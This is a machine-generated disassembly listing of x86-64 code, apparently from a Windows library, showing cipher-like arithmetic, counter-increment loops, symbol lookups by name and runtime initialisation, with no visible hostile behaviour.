    6d8c814a:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
    6d8c8151:	00 
    6d8c8152:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
    6d8c8159:	00 
    6d8c815a:	48 33 4c 24 78       	xor    0x78(%rsp),%rcx
    6d8c815f:	4c 89 bc 24 98 00 00 	mov    %r15,0x98(%rsp)
    6d8c8166:	00 
    6d8c8167:	48 23 5c 24 50       	and    0x50(%rsp),%rbx
    6d8c816c:	4c 89 94 24 90 00 00 	mov    %r10,0x90(%rsp)
    6d8c8173:	00 
    6d8c8174:	48 33 5c 24 68       	xor    0x68(%rsp),%rbx
    6d8c8179:	48 31 f5             	xor    %rsi,%rbp
    6d8c817c:	4c 31 cd             	xor    %r9,%rbp
    6d8c817f:	48 31 c8             	xor    %rcx,%rax
    6d8c8182:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    6d8c8187:	4c 31 dd             	xor    %r11,%rbp
    6d8c818a:	48 f7 d5             	not    %rbp
    6d8c818d:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
    6d8c8194:	00 
    6d8c8195:	49 31 db             	xor    %rbx,%r11
    6d8c8198:	48 89 ac 24 b8 00 00 	mov    %rbp,0xb8(%rsp)
    6d8c819f:	00 
    6d8c81a0:	4c 89 9c 24 a0 00 00 	mov    %r11,0xa0(%rsp)
    6d8c81a7:	00 
    6d8c81a8:	e8 53 fa ff ff       	call   0x6d8c7c00
    6d8c81ad:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
    6d8c81b4:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
    6d8c81bb:	5b                   	pop    %rbx
    6d8c81bc:	5e                   	pop    %rsi
    6d8c81bd:	5f                   	pop    %rdi
    6d8c81be:	5d                   	pop    %rbp
    6d8c81bf:	41 5c                	pop    %r12
    6d8c81c1:	41 5d                	pop    %r13
    6d8c81c3:	41 5e                	pop    %r14
    6d8c81c5:	41 5f                	pop    %r15
    6d8c81c7:	c3                   	ret
    6d8c81c8:	90                   	nop
    6d8c81c9:	90                   	nop
    6d8c81ca:	90                   	nop
    6d8c81cb:	90                   	nop
    6d8c81cc:	90                   	nop
    6d8c81cd:	90                   	nop
    6d8c81ce:	90                   	nop
    6d8c81cf:	90                   	nop
    6d8c81d0:	31 c0                	xor    %eax,%eax
    6d8c81d2:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c81d7:	44 0f b6 44 01 0f    	movzbl 0xf(%rcx,%rax,1),%r8d
    6d8c81dd:	44 01 c2             	add    %r8d,%edx
    6d8c81e0:	88 54 01 0f          	mov    %dl,0xf(%rcx,%rax,1)
    6d8c81e4:	48 ff c8             	dec    %rax
    6d8c81e7:	c1 ea 08             	shr    $0x8,%edx
    6d8c81ea:	48 83 f8 f0          	cmp    $0xfffffffffffffff0,%rax
    6d8c81ee:	75 e7                	jne    0x6d8c81d7
    6d8c81f0:	c3                   	ret
    6d8c81f1:	31 c0                	xor    %eax,%eax
    6d8c81f3:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c81f8:	44 0f b6 44 01 1f    	movzbl 0x1f(%rcx,%rax,1),%r8d
    6d8c81fe:	44 01 c2             	add    %r8d,%edx
    6d8c8201:	88 54 01 1f          	mov    %dl,0x1f(%rcx,%rax,1)
    6d8c8205:	48 ff c8             	dec    %rax
    6d8c8208:	c1 ea 08             	shr    $0x8,%edx
    6d8c820b:	48 83 f8 e0          	cmp    $0xffffffffffffffe0,%rax
    6d8c820f:	75 e7                	jne    0x6d8c81f8
    6d8c8211:	c3                   	ret
    6d8c8212:	90                   	nop
    6d8c8213:	90                   	nop
    6d8c8214:	90                   	nop
    6d8c8215:	90                   	nop
    6d8c8216:	90                   	nop
    6d8c8217:	90                   	nop
    6d8c8218:	90                   	nop
    6d8c8219:	90                   	nop
    6d8c821a:	90                   	nop
    6d8c821b:	90                   	nop
    6d8c821c:	90                   	nop
    6d8c821d:	90                   	nop
    6d8c821e:	90                   	nop
    6d8c821f:	90                   	nop
    6d8c8220:	48 8d 05 a9 a5 00 00 	lea    0xa5a9(%rip),%rax        # 0x6d8d27d0
    6d8c8227:	48 85 c9             	test   %rcx,%rcx
    6d8c822a:	74 0a                	je     0x6d8c8236
    6d8c822c:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6d8c8230:	74 04                	je     0x6d8c8236
    6d8c8232:	48 8d 41 10          	lea    0x10(%rcx),%rax
    6d8c8236:	48 89 c1             	mov    %rax,%rcx
    6d8c8239:	48 ff 25 04 90 10 00 	rex.W jmp *0x109004(%rip)        # 0x6d9d1244
    6d8c8240:	48 ff 25 d5 8f 10 00 	rex.W jmp *0x108fd5(%rip)        # 0x6d9d121c
    6d8c8247:	90                   	nop
    6d8c8248:	90                   	nop
    6d8c8249:	90                   	nop
    6d8c824a:	90                   	nop
    6d8c824b:	90                   	nop
    6d8c824c:	90                   	nop
    6d8c824d:	90                   	nop
    6d8c824e:	90                   	nop
    6d8c824f:	90                   	nop
    6d8c8250:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c8254:	48 8d 0d a5 a6 00 00 	lea    0xa6a5(%rip),%rcx        # 0x6d8d2900
    6d8c825b:	31 d2                	xor    %edx,%edx
    6d8c825d:	e8 be ff ff ff       	call   0x6d8c8220
    6d8c8262:	48 85 c0             	test   %rax,%rax
    6d8c8265:	48 89 05 c4 65 10 00 	mov    %rax,0x1065c4(%rip)        # 0x6d9ce830
    6d8c826c:	74 16                	je     0x6d8c8284
    6d8c826e:	48 8d 15 6b a5 00 00 	lea    0xa56b(%rip),%rdx        # 0x6d8d27e0
    6d8c8275:	48 89 c1             	mov    %rax,%rcx
    6d8c8278:	e8 c3 ff ff ff       	call   0x6d8c8240
    6d8c827d:	48 89 05 ec 41 0f 00 	mov    %rax,0xf41ec(%rip)        # 0x6d9bc470
    6d8c8284:	48 83 c4 28          	add    $0x28,%rsp
    6d8c8288:	c3                   	ret
    6d8c8289:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c828d:	48 8d 0d 4c a6 00 00 	lea    0xa64c(%rip),%rcx        # 0x6d8d28e0
    6d8c8294:	e8 be c7 ff ff       	call   0x6d8c4a57
    6d8c8299:	48 85 c0             	test   %rax,%rax
    6d8c829c:	48 89 05 d5 41 0f 00 	mov    %rax,0xf41d5(%rip)        # 0x6d9bc478
    6d8c82a3:	75 0c                	jne    0x6d8c82b1
    6d8c82a5:	48 8d 0d 14 a6 00 00 	lea    0xa614(%rip),%rcx        # 0x6d8d28c0
    6d8c82ac:	e8 bd c7 ff ff       	call   0x6d8c4a6e
    6d8c82b1:	48 8b 0d c0 41 0f 00 	mov    0xf41c0(%rip),%rcx        # 0x6d9bc478
    6d8c82b8:	48 8d 15 2b a5 00 00 	lea    0xa52b(%rip),%rdx        # 0x6d8d27ea
    6d8c82bf:	e8 8a c8 ff ff       	call   0x6d8c4b4e
    6d8c82c4:	48 8b 0d ad 41 0f 00 	mov    0xf41ad(%rip),%rcx        # 0x6d9bc478
    6d8c82cb:	48 8d 15 23 a5 00 00 	lea    0xa523(%rip),%rdx        # 0x6d8d27f5
    6d8c82d2:	48 89 05 9f 65 10 00 	mov    %rax,0x10659f(%rip)        # 0x6d9ce878
    6d8c82d9:	e8 70 c8 ff ff       	call   0x6d8c4b4e
    6d8c82de:	48 8b 0d 93 41 0f 00 	mov    0xf4193(%rip),%rcx        # 0x6d9bc478
    6d8c82e5:	48 8d 15 18 a5 00 00 	lea    0xa518(%rip),%rdx        # 0x6d8d2804
    6d8c82ec:	48 89 05 8d 65 10 00 	mov    %rax,0x10658d(%rip)        # 0x6d9ce880
    6d8c82f3:	e8 56 c8 ff ff       	call   0x6d8c4b4e
    6d8c82f8:	48 8b 0d 79 41 0f 00 	mov    0xf4179(%rip),%rcx        # 0x6d9bc478
    6d8c82ff:	48 8d 15 08 a5 00 00 	lea    0xa508(%rip),%rdx        # 0x6d8d280e
    6d8c8306:	48 89 05 3b 65 10 00 	mov    %rax,0x10653b(%rip)        # 0x6d9ce848
    6d8c830d:	e8 3c c8 ff ff       	call   0x6d8c4b4e
    6d8c8312:	48 8b 0d 5f 41 0f 00 	mov    0xf415f(%rip),%rcx        # 0x6d9bc478
    6d8c8319:	48 8d 15 fb a4 00 00 	lea    0xa4fb(%rip),%rdx        # 0x6d8d281b
    6d8c8320:	48 89 05 61 65 10 00 	mov    %rax,0x106561(%rip)        # 0x6d9ce888
    6d8c8327:	e8 22 c8 ff ff       	call   0x6d8c4b4e
    6d8c832c:	48 8b 0d 45 41 0f 00 	mov    0xf4145(%rip),%rcx        # 0x6d9bc478
    6d8c8333:	48 8d 15 f6 a4 00 00 	lea    0xa4f6(%rip),%rdx        # 0x6d8d2830
    6d8c833a:	48 89 05 57 65 10 00 	mov    %rax,0x106557(%rip)        # 0x6d9ce898
    6d8c8341:	e8 08 c8 ff ff       	call   0x6d8c4b4e
    6d8c8346:	48 8b 0d 2b 41 0f 00 	mov    0xf412b(%rip),%rcx        # 0x6d9bc478
    6d8c834d:	48 8d 15 ed a4 00 00 	lea    0xa4ed(%rip),%rdx        # 0x6d8d2841
    6d8c8354:	48 89 05 fd 64 10 00 	mov    %rax,0x1064fd(%rip)        # 0x6d9ce858
    6d8c835b:	e8 ee c7 ff ff       	call   0x6d8c4b4e
    6d8c8360:	48 8b 0d 11 41 0f 00 	mov    0xf4111(%rip),%rcx        # 0x6d9bc478
    6d8c8367:	48 8d 15 df a4 00 00 	lea    0xa4df(%rip),%rdx        # 0x6d8d284d
    6d8c836e:	48 89 05 c3 64 10 00 	mov    %rax,0x1064c3(%rip)        # 0x6d9ce838
    6d8c8375:	e8 d4 c7 ff ff       	call   0x6d8c4b4e
    6d8c837a:	48 8b 0d f7 40 0f 00 	mov    0xf40f7(%rip),%rcx        # 0x6d9bc478
    6d8c8381:	48 8d 15 d7 a4 00 00 	lea    0xa4d7(%rip),%rdx        # 0x6d8d285f
    6d8c8388:	48 89 05 c1 64 10 00 	mov    %rax,0x1064c1(%rip)        # 0x6d9ce850
    6d8c838f:	e8 ba c7 ff ff       	call   0x6d8c4b4e
    6d8c8394:	48 8b 0d dd 40 0f 00 	mov    0xf40dd(%rip),%rcx        # 0x6d9bc478
    6d8c839b:	48 8d 15 cd a4 00 00 	lea    0xa4cd(%rip),%rdx        # 0x6d8d286f
    6d8c83a2:	48 89 05 97 64 10 00 	mov    %rax,0x106497(%rip)        # 0x6d9ce840
    6d8c83a9:	e8 a0 c7 ff ff       	call   0x6d8c4b4e
    6d8c83ae:	48 8b 0d c3 40 0f 00 	mov    0xf40c3(%rip),%rcx        # 0x6d9bc478
    6d8c83b5:	48 8d 15 bf a4 00 00 	lea    0xa4bf(%rip),%rdx        # 0x6d8d287b
    6d8c83bc:	48 89 05 ad 64 10 00 	mov    %rax,0x1064ad(%rip)        # 0x6d9ce870
    6d8c83c3:	e8 86 c7 ff ff       	call   0x6d8c4b4e
    6d8c83c8:	48 8b 0d a9 40 0f 00 	mov    0xf40a9(%rip),%rcx        # 0x6d9bc478
    6d8c83cf:	48 8d 15 b2 a4 00 00 	lea    0xa4b2(%rip),%rdx        # 0x6d8d2888
    6d8c83d6:	48 89 05 83 64 10 00 	mov    %rax,0x106483(%rip)        # 0x6d9ce860
    6d8c83dd:	e8 6c c7 ff ff       	call   0x6d8c4b4e
    6d8c83e2:	48 8b 0d 8f 40 0f 00 	mov    0xf408f(%rip),%rcx        # 0x6d9bc478
    6d8c83e9:	48 8d 15 a7 a4 00 00 	lea    0xa4a7(%rip),%rdx        # 0x6d8d2897
    6d8c83f0:	48 89 05 99 64 10 00 	mov    %rax,0x106499(%rip)        # 0x6d9ce890
    6d8c83f7:	e8 52 c7 ff ff       	call   0x6d8c4b4e
    6d8c83fc:	48 89 05 65 64 10 00 	mov    %rax,0x106465(%rip)        # 0x6d9ce868
    6d8c8403:	48 83 c4 28          	add    $0x28,%rsp
    6d8c8407:	c3                   	ret
    6d8c8408:	90                   	nop
    6d8c8409:	90                   	nop
    6d8c840a:	90                   	nop
    6d8c840b:	90                   	nop
    6d8c840c:	90                   	nop
    6d8c840d:	90                   	nop
    6d8c840e:	90                   	nop
    6d8c840f:	90                   	nop
    6d8c8410:	c3                   	ret
    6d8c8411:	48 8b 0d 08 65 10 00 	mov    0x106508(%rip),%rcx        # 0x6d9ce920
    6d8c8418:	31 d2                	xor    %edx,%edx
    6d8c841a:	e9 d7 b0 ff ff       	jmp    0x6d8c34f6
    6d8c841f:	48 8b 0d da 65 10 00 	mov    0x1065da(%rip),%rcx        # 0x6d9cea00
    6d8c8426:	31 d2                	xor    %edx,%edx
    6d8c8428:	e9 c9 b0 ff ff       	jmp    0x6d8c34f6
    6d8c842d:	56                   	push   %rsi
    6d8c842e:	53                   	push   %rbx
    6d8c842f:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c8433:	48 89 ce             	mov    %rcx,%rsi
    6d8c8436:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c843a:	48 89 d3             	mov    %rdx,%rbx
    6d8c843d:	e8 b4 b0 ff ff       	call   0x6d8c34f6
    6d8c8442:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c8446:	48 89 da             	mov    %rbx,%rdx
    6d8c8449:	e8 a8 b0 ff ff       	call   0x6d8c34f6
    6d8c844e:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c8452:	48 89 da             	mov    %rbx,%rdx
    6d8c8455:	48 83 c4 28          	add    $0x28,%rsp
    6d8c8459:	5b                   	pop    %rbx
    6d8c845a:	5e                   	pop    %rsi
    6d8c845b:	e9 96 b0 ff ff       	jmp    0x6d8c34f6
    6d8c8460:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c8464:	48 8d 0d b4 ff ff ff 	lea    -0x4c(%rip),%rcx        # 0x6d8c841f
    6d8c846b:	e8 8e b0 ff ff       	call   0x6d8c34fe
    6d8c8470:	48 8d 0d 9a ff ff ff 	lea    -0x66(%rip),%rcx        # 0x6d8c8411
    6d8c8477:	48 83 c4 28          	add    $0x28,%rsp
    6d8c847b:	e9 7e b0 ff ff       	jmp    0x6d8c34fe
    6d8c8480:	48 8d 15 19 64 10 00 	lea    0x106419(%rip),%rdx        # 0x6d9ce8a0
    6d8c8487:	c6 05 a2 65 10 00 12 	movb   $0x12,0x1065a2(%rip)        # 0x6d9cea30
    6d8c848e:	48 89 15 ab 40 0f 00 	mov    %rdx,0xf40ab(%rip)        # 0x6d9bc540
    6d8c8495:	48 8b 15 b4 02 0f 00 	mov    0xf02b4(%rip),%rdx        # 0x6d9b8750
    6d8c849c:	48 8d 0d 8d 40 0f 00 	lea    0xf408d(%rip),%rcx        # 0x6d9bc530
    6d8c84a3:	48 89 0d d6 3f 0f 00 	mov    %rcx,0xf3fd6(%rip)        # 0x6d9bc480
    6d8c84aa:	48 8d 0d 6f a4 00 00 	lea    0xa46f(%rip),%rcx        # 0x6d8d2920
    6d8c84b1:	48 89 0d 90 40 0f 00 	mov    %rcx,0xf4090(%rip)        # 0x6d9bc548
    6d8c84b8:	48 8d 0d a1 40 0f 00 	lea    0xf40a1(%rip),%rcx        # 0x6d9bc560
    6d8c84bf:	48 89 0d c2 3f 0f 00 	mov    %rcx,0xf3fc2(%rip)        # 0x6d9bc488
    6d8c84c6:	48 83 c1 30          	add    $0x30,%rcx
    6d8c84ca:	48 89 15 27 64 10 00 	mov    %rdx,0x106427(%rip)        # 0x6d9ce8f8
    6d8c84d1:	48 8d 15 08 64 10 00 	lea    0x106408(%rip),%rdx        # 0x6d9ce8e0
    6d8c84d8:	48 8d 05 f1 3f 0f 00 	lea    0xf3ff1(%rip),%rax        # 0x6d9bc4d0
    6d8c84df:	48 89 0d 1a 64 10 00 	mov    %rcx,0x10641a(%rip)        # 0x6d9ce900
    6d8c84e6:	48 89 15 6b 64 10 00 	mov    %rdx,0x10646b(%rip)        # 0x6d9ce958
    6d8c84ed:	48 8d 0d 33 a4 00 00 	lea    0xa433(%rip),%rcx        # 0x6d8d2927
    6d8c84f4:	48 8d 15 15 ff ff ff 	lea    -0xeb(%rip),%rdx        # 0x6d8c8410
    6d8c84fb:	48 89 05 1e 41 0f 00 	mov    %rax,0xf411e(%rip)        # 0x6d9bc620
    6d8c8502:	48 89 15 67 64 10 00 	mov    %rdx,0x106467(%rip)        # 0x6d9ce970
    6d8c8509:	48 8d 05 70 64 10 00 	lea    0x106470(%rip),%rax        # 0x6d9ce980
    6d8c8510:	48 c7 05 05 65 10 00 	movq   $0x28,0x106505(%rip)        # 0x6d9cea20
    6d8c8517:	28 00 00 00 
    6d8c851b:	48 8d 15 1e 64 10 00 	lea    0x10641e(%rip),%rdx        # 0x6d9ce940
    6d8c8522:	48 c7 05 fb 64 10 00 	movq   $0x8,0x1064fb(%rip)        # 0x6d9cea28
    6d8c8529:	08 00 00 00 
    6d8c852d:	48 c7 05 00 65 10 00 	movq   $0x0,0x106500(%rip)        # 0x6d9cea38
    6d8c8534:	00 00 00 00 
    6d8c8538:	48 c7 05 3d 64 10 00 	movq   $0x10,0x10643d(%rip)        # 0x6d9ce980
    6d8c853f:	10 00 00 00 
    6d8c8543:	48 c7 05 3a 64 10 00 	movq   $0x8,0x10643a(%rip)        # 0x6d9ce988
    6d8c854a:	08 00 00 00 
    6d8c854e:	c6 05 3b 64 10 00 12 	movb   $0x12,0x10643b(%rip)        # 0x6d9ce990
    6d8c8555:	48 c7 05 38 64 10 00 	movq   $0x0,0x106438(%rip)        # 0x6d9ce998
    6d8c855c:	00 00 00 00 
    6d8c8560:	48 c7 05 4d 63 10 00 	movq   $0x0,0x10634d(%rip)        # 0x6d9ce8b8
    6d8c8567:	00 00 00 00 
    6d8c856b:	48 c7 05 2a 63 10 00 	movq   $0x8,0x10632a(%rip)        # 0x6d9ce8a0
    6d8c8572:	08 00 00 00 
    6d8c8576:	48 c7 05 27 63 10 00 	movq   $0x8,0x106327(%rip)        # 0x6d9ce8a8
    6d8c857d:	08 00 00 00 
    6d8c8581:	66 c7 05 26 63 10 00 	movw   $0x31a,0x106326(%rip)        # 0x6d9ce8b0
    6d8c8588:	1a 03 
    6d8c858a:	c6 05 9f 3f 0f 00 01 	movb   $0x1,0xf3f9f(%rip)        # 0x6d9bc530
    6d8c8591:	48 c7 05 9c 3f 0f 00 	movq   $0x0,0xf3f9c(%rip)        # 0x6d9bc538
    6d8c8598:	00 00 00 00 
    6d8c859c:	48 c7 05 39 63 10 00 	movq   $0x8,0x106339(%rip)        # 0x6d9ce8e0
    6d8c85a3:	08 00 00 00 
    6d8c85a7:	48 c7 05 36 63 10 00 	movq   $0x8,0x106336(%rip)        # 0x6d9ce8e8
    6d8c85ae:	08 00 00 00 
    6d8c85b2:	66 c7 05 35 63 10 00 	movw   $0x111,0x106335(%rip)        # 0x6d9ce8f0
    6d8c85b9:	11 01 
    6d8c85bb:	48 c7 05 ea 3f 0f 00 	movq   $0x0,0xf3fea(%rip)        # 0x6d9bc5b0
    6d8c85c2:	00 00 00 00 
    6d8c85c6:	c6 05 c3 3f 0f 00 02 	movb   $0x2,0xf3fc3(%rip)        # 0x6d9bc590
    6d8c85cd:	48 c7 05 68 63 10 00 	movq   $0x8,0x106368(%rip)        # 0x6d9ce940
    6d8c85d4:	08 00 00 00 
    6d8c85d8:	48 c7 05 65 63 10 00 	movq   $0x8,0x106365(%rip)        # 0x6d9ce948
    6d8c85df:	08 00 00 00 
    6d8c85e3:	c6 05 66 63 10 00 16 	movb   $0x16,0x106366(%rip)        # 0x6d9ce950
    6d8c85ea:	c6 05 6f 3f 0f 00 01 	movb   $0x1,0xf3f6f(%rip)        # 0x6d9bc560
    6d8c85f1:	48 89 0d 80 3f 0f 00 	mov    %rcx,0xf3f80(%rip)        # 0x6d9bc578
    6d8c85f8:	48 8d 0d 01 3f 0f 00 	lea    0xf3f01(%rip),%rcx        # 0x6d9bc500
    6d8c85ff:	48 89 0d 9a 63 10 00 	mov    %rcx,0x10639a(%rip)        # 0x6d9ce9a0
    6d8c8606:	48 81 c1 c0 00 00 00 	add    $0xc0,%rcx
    6d8c860d:	48 89 05 cc 3e 0f 00 	mov    %rax,0xf3ecc(%rip)        # 0x6d9bc4e0
    6d8c8614:	48 89 05 b5 3f 0f 00 	mov    %rax,0xf3fb5(%rip)        # 0x6d9bc5d0
    6d8c861b:	48 8d 05 22 a3 00 00 	lea    0xa322(%rip),%rax        # 0x6d8d2944
    6d8c8622:	48 89 05 af 3f 0f 00 	mov    %rax,0xf3faf(%rip)        # 0x6d9bc5d8
    6d8c8629:	48 8d 41 30          	lea    0x30(%rcx),%rax
    6d8c862d:	48 89 05 fc 3f 0f 00 	mov    %rax,0xf3ffc(%rip)        # 0x6d9bc630
    6d8c8634:	48 8b 05 45 01 0f 00 	mov    0xf0145(%rip),%rax        # 0x6d9b8780
    6d8c863b:	48 89 15 2e 3f 0f 00 	mov    %rdx,0xf3f2e(%rip)        # 0x6d9bc570
    6d8c8642:	48 8d 15 37 3e 0f 00 	lea    0xf3e37(%rip),%rdx        # 0x6d9bc480
    6d8c8649:	48 89 15 d8 3e 0f 00 	mov    %rdx,0xf3ed8(%rip)        # 0x6d9bc528
    6d8c8650:	48 8d 15 d7 a2 00 00 	lea    0xa2d7(%rip),%rdx        # 0x6d8d292e
    6d8c8657:	48 c7 05 06 3f 0f 00 	movq   $0x8,0xf3f06(%rip)        # 0x6d9bc568
    6d8c865e:	08 00 00 00 
    6d8c8662:	48 89 05 97 3f 0f 00 	mov    %rax,0xf3f97(%rip)        # 0x6d9bc600
    6d8c8669:	48 8d 05 ed a2 00 00 	lea    0xa2ed(%rip),%rax        # 0x6d8d295d
    6d8c8670:	48 89 05 91 3f 0f 00 	mov    %rax,0xf3f91(%rip)        # 0x6d9bc608
    6d8c8677:	48 8d 05 a2 3f 0f 00 	lea    0xf3fa2(%rip),%rax        # 0x6d9bc620
    6d8c867e:	48 89 05 43 3e 0f 00 	mov    %rax,0xf3e43(%rip)        # 0x6d9bc4c8
    6d8c8685:	48 8d 81 e0 fe ff ff 	lea    -0x120(%rcx),%rax
    6d8c868c:	48 89 05 ad 63 10 00 	mov    %rax,0x1063ad(%rip)        # 0x6d9cea40
    6d8c8693:	48 8d 05 86 63 10 00 	lea    0x106386(%rip),%rax        # 0x6d9cea20
    6d8c869a:	48 89 05 37 63 10 00 	mov    %rax,0x106337(%rip)        # 0x6d9ce9d8
    6d8c86a1:	48 8d 05 85 fd ff ff 	lea    -0x27b(%rip),%rax        # 0x6d8c842d
    6d8c86a8:	48 c7 05 6d 3e 0f 00 	movq   $0x2,0xf3e6d(%rip)        # 0x6d9bc520
    6d8c86af:	02 00 00 00 
    6d8c86b3:	c6 05 46 3e 0f 00 02 	movb   $0x2,0xf3e46(%rip)        # 0x6d9bc500
    6d8c86ba:	c6 05 0f 3e 0f 00 01 	movb   $0x1,0xf3e0f(%rip)        # 0x6d9bc4d0
    6d8c86c1:	48 c7 05 0c 3e 0f 00 	movq   $0x0,0xf3e0c(%rip)        # 0x6d9bc4d8
    6d8c86c8:	00 00 00 00 
    6d8c86cc:	48 89 15 15 3e 0f 00 	mov    %rdx,0xf3e15(%rip)        # 0x6d9bc4e8
    6d8c86d3:	48 89 0d 4e 3f 0f 00 	mov    %rcx,0xf3f4e(%rip)        # 0x6d9bc628
    6d8c86da:	c6 05 df 3e 0f 00 01 	movb   $0x1,0xf3edf(%rip)        # 0x6d9bc5c0
    6d8c86e1:	48 c7 05 dc 3e 0f 00 	movq   $0x10,0xf3edc(%rip)        # 0x6d9bc5c8
    6d8c86e8:	10 00 00 00 
    6d8c86ec:	c6 05 fd 3e 0f 00 01 	movb   $0x1,0xf3efd(%rip)        # 0x6d9bc5f0
    6d8c86f3:	48 c7 05 fa 3e 0f 00 	movq   $0x20,0xf3efa(%rip)        # 0x6d9bc5f8
    6d8c86fa:	20 00 00 00 
    6d8c86fe:	48 c7 05 b7 3d 0f 00 	movq   $0x3,0xf3db7(%rip)        # 0x6d9bc4c0
    6d8c8705:	03 00 00 00 
    6d8c8709:	c6 05 90 3d 0f 00 02 	movb   $0x2,0xf3d90(%rip)        # 0x6d9bc4a0
    6d8c8710:	48 c7 05 a5 62 10 00 	movq   $0x8,0x1062a5(%rip)        # 0x6d9ce9c0
    6d8c8717:	08 00 00 00 
    6d8c871b:	48 c7 05 a2 62 10 00 	movq   $0x8,0x1062a2(%rip)        # 0x6d9ce9c8
    6d8c8722:	08 00 00 00 
    6d8c8726:	c6 05 a3 62 10 00 16 	movb   $0x16,0x1062a3(%rip)        # 0x6d9ce9d0
    6d8c872d:	48 89 05 bc 62 10 00 	mov    %rax,0x1062bc(%rip)        # 0x6d9ce9f0
    6d8c8734:	c3                   	ret
    6d8c8735:	90                   	nop
    6d8c8736:	90                   	nop
    6d8c8737:	90                   	nop
    6d8c8738:	90                   	nop
    6d8c8739:	90                   	nop
    6d8c873a:	90                   	nop
    6d8c873b:	90                   	nop
    6d8c873c:	90                   	nop
    6d8c873d:	90                   	nop
    6d8c873e:	90                   	nop
    6d8c873f:	90                   	nop
    6d8c8740:	56                   	push   %rsi
    6d8c8741:	53                   	push   %rbx
    6d8c8742:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c8746:	48 85 d2             	test   %rdx,%rdx
    6d8c8749:	48 89 ce             	mov    %rcx,%rsi
    6d8c874c:	48 89 d3             	mov    %rdx,%rbx
    6d8c874f:	74 05                	je     0x6d8c8756
    6d8c8751:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    6d8c8756:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c8759:	48 85 c9             	test   %rcx,%rcx
    6d8c875c:	74 26                	je     0x6d8c8784
    6d8c875e:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c8762:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    6d8c8766:	48 83 e8 08          	sub    $0x8,%rax
    6d8c876a:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c876e:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    6d8c8772:	77 10                	ja     0x6d8c8784
    6d8c8774:	48 8b 0d 15 01 0f 00 	mov    0xf0115(%rip),%rcx        # 0x6d9b8890
    6d8c877b:	48 83 c1 18          	add    $0x18,%rcx
    6d8c877f:	e8 e7 a5 ff ff       	call   0x6d8c2d6b
    6d8c8784:	48 89 1e             	mov    %rbx,(%rsi)
    6d8c8787:	48 83 c4 28          	add    $0x28,%rsp
    6d8c878b:	5b                   	pop    %rbx
    6d8c878c:	5e                   	pop    %rsi
    6d8c878d:	c3                   	ret
    6d8c878e:	48 8b 0d cb 62 10 00 	mov    0x1062cb(%rip),%rcx        # 0x6d9cea60
    6d8c8795:	31 d2                	xor    %edx,%edx
    6d8c8797:	e9 5a ad ff ff       	jmp    0x6d8c34f6
    6d8c879c:	57                   	push   %rdi
    6d8c879d:	56                   	push   %rsi
    6d8c879e:	53                   	push   %rbx
    6d8c879f:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c87a3:	31 db                	xor    %ebx,%ebx
    6d8c87a5:	48 89 ce             	mov    %rcx,%rsi
    6d8c87a8:	48 89 d7             	mov    %rdx,%rdi
    6d8c87ab:	48 85 f6             	test   %rsi,%rsi
    6d8c87ae:	74 17                	je     0x6d8c87c7
    6d8c87b0:	48 3b 1e             	cmp    (%rsi),%rbx
    6d8c87b3:	7d 12                	jge    0x6d8c87c7
    6d8c87b5:	48 8b 4c de 10       	mov    0x10(%rsi,%rbx,8),%rcx
    6d8c87ba:	48 89 fa             	mov    %rdi,%rdx
    6d8c87bd:	48 ff c3             	inc    %rbx
    6d8c87c0:	e8 31 ad ff ff       	call   0x6d8c34f6
    6d8c87c5:	eb e4                	jmp    0x6d8c87ab
    6d8c87c7:	48 83 c4 20          	add    $0x20,%rsp
    6d8c87cb:	5b                   	pop    %rbx
    6d8c87cc:	5e                   	pop    %rsi
    6d8c87cd:	5f                   	pop    %rdi
    6d8c87ce:	c3                   	ret
    6d8c87cf:	57                   	push   %rdi
    6d8c87d0:	56                   	push   %rsi
    6d8c87d1:	48 8b 3a             	mov    (%rdx),%rdi
    6d8c87d4:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    6d8c87d8:	48 89 c8             	mov    %rcx,%rax
    6d8c87db:	48 8b 09             	mov    (%rcx),%rcx
    6d8c87de:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6d8c87e3:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8c87e7:	4c 89 c7             	mov    %r8,%rdi
    6d8c87ea:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c87ec:	48 8b 12             	mov    (%rdx),%rdx
    6d8c87ef:	48 01 10             	add    %rdx,(%rax)
    6d8c87f2:	5e                   	pop    %rsi
    6d8c87f3:	5f                   	pop    %rdi
    6d8c87f4:	c3                   	ret
    6d8c87f5:	53                   	push   %rbx
    6d8c87f6:	48 83 ec 50          	sub    $0x50,%rsp
    6d8c87fa:	31 db                	xor    %ebx,%ebx
    6d8c87fc:	85 c9                	test   %ecx,%ecx
    6d8c87fe:	41 89 c8             	mov    %ecx,%r8d
    6d8c8801:	74 5d                	je     0x6d8c8860
    6d8c8803:	45 31 c9             	xor    %r9d,%r9d
    6d8c8806:	31 d2                	xor    %edx,%edx
    6d8c8808:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    6d8c880f:	00 
    6d8c8810:	31 db                	xor    %ebx,%ebx
    6d8c8812:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
    6d8c8817:	b9 00 13 00 00       	mov    $0x1300,%ecx
